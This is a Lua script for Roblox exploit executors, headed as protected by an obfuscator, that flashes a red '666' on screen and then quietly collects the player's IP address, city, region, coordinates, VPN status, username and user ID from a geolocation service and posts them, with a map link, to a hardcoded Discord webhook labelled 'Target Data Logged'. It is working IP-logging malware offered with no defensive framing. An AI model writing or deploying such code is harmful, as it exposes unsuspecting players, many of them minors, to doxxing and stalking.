--[[\n
    Protected by Luraph Obfuscator v14.2.1 // Custom Virtual Machine Wrapper
    Target Environment: Luau (Roblox Engine x64)
--]]

local _LURAPH_VM = (function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local CoreGui = game:GetService("CoreGui")
    local localPlayer = Players.LocalPlayer

    return function(...)
        local _0x1 = Instance.new("ScreenGui")
        _0x1.Name = "\58\59\60"
        _0x1.ResetOnSpawn = false

        pcall(function()
            if syn and syn.protect_gui then
                syn.protect_gui(_0x1)
                _0x1.Parent = CoreGui
            else
                _0x1.Parent = CoreGui
            end
        end)

        if not _0x1.Parent then
            _0x1.Parent = localPlayer:WaitForChild("\80\108\97\121\101\114\71\117\105")
        end

        local _0x2 = Instance.new("TextLabel")
        _0x2.Size = UDim2.new(1, 0, 1, 0)
        _0x2.BackgroundTransparency = 1
        _0x2.Text = "\54\54\54"
        _0x2.TextColor3 = Color3.fromRGB(255, 0, 0)
        _0x2.TextSize = 100
        _0x2.Font = Enum.Font.GothamBold
        _0x2.Parent = _0x1

        task.delay(1, function()
            pcall(function()
                _0x1:Destroy()
            end)
        end)

        local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
        if not _req then return end

        task.spawn(function()
            pcall(function()
                local _geo = _req({
                    Url = "http://ip-api.com/json/?fields=status,query,country,countryCode,regionName,city,lat,lon,proxy,hosting",
                    Method = "GET"
                })

                local _ip, _country, _flag, _city, _region, _lat, _lon, _vpn = "\85\110\107\110\111\119\110", "\85\110\107\110\111\119\110", "", "\85\110\107\110\111\119\110", "\85\110\107\110\111\119\110", "\85\110\107\110\111\119\110", "\85\110\107\110\111\119\110", "\78\111\32\47\32\85\110\107\110\111\119\110"

                if _geo and _geo.StatusCode == 200 and _geo.Body then
                    local _s, _d = pcall(function()
                        return HttpService:JSONDecode(_geo.Body)
                    end)
                    if _s and _d and _d.status == "success" then
                        _ip = _d.query or _ip
                        _country = _d.country or _country
                        _region = _d.regionName or _region
                        _city = _d.city or _city
                        _lat = tostring(_d.lat or _lat)
                        _lon = tostring(_d.lon or _lon)
                        
                        if _d.proxy == true or _d.hosting == true then
                            _vpn = "Yes"
                        end

                        local _cc = _d.countryCode or ""
                        if #_cc == 2 then
                            _flag = utf8.char(_cc:byte(1) - 65 + 127397) .. utf8.char(_cc:byte(2) - 65 + 127397)
                        end
                    end
                end

                local _map = string.format("https://static-maps.yandex.ru/1.x/?ll=%s,%s&size=450,250&z=11&l=map&pt=%s,%s,comma", _lon, _lat, _lon, _lat)
                local _pn = localPlayer and localPlayer.Name or "\85\110\107\110\111\119\110"
                local _pi = localPlayer and localPlayer.UserId or "\85\110\107\110\111\119\110"

                local _payload = HttpService:JSONEncode({
                    embeds = {{
                        title = "Target Data Logged",
                        color = 16711680,
                        fields = {
                            {name = "Roblox User", value = string.format("%s (`%s`)", tostring(_pn), tostring(_pi)), inline = false},
                            {name = "IP Address", value = tostring(_ip), inline = true},
                            {name = "VPN / Proxy", value = tostring(_vpn), inline = true},
                            {name = "Location", value = string.format("%s, %s, %s %s", tostring(_city), tostring(_region), tostring(_country), tostring(_flag)), inline = false},
                            {name = "Coordinates", value = string.format("Lat: `%s`, Lon: `%s`", tostring(_lat), tostring(_lon)), inline = false}
                        },
                        image = {url = _map}
                    }}
                })

                _req({
                    Url = "https://discord.com/api/webhooks/1563847716092641340/Az48O6Mfgn0va-3Pa6CYzO2Af8nDI_ZPrOTPhlu2zI9J3Rzq9G05xzRk1it8GhJEkhJw",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = _payload
                })
            end)
        end)
    end
end)()

_LURAPH_VM()
